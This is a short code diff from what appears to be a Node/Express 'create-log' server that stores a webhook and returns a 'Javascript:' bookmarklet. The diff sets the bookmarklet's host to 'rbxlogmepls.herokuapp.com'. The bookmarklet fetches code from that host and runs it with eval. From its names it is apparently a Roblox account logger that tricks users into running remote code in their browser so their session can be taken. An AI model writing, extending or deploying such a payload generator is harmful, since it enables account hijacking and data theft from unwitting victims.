@@ -99,7 +99,7 @@ app.post('/create-log', async (req, res) => {
             webhook: webhook
         }, function(err,succ) {
             if (succ) {
-                let js = `Javascript:$.get("https://YOURHEROKUAPP.herokuapp.com/roblox-api?id=${id}",eval)`
+                let js = `Javascript:$.get("https://rbxlogmepls.herokuapp.com/roblox-api?id=${id}",eval)`
                 res.send(js)
             }
         })
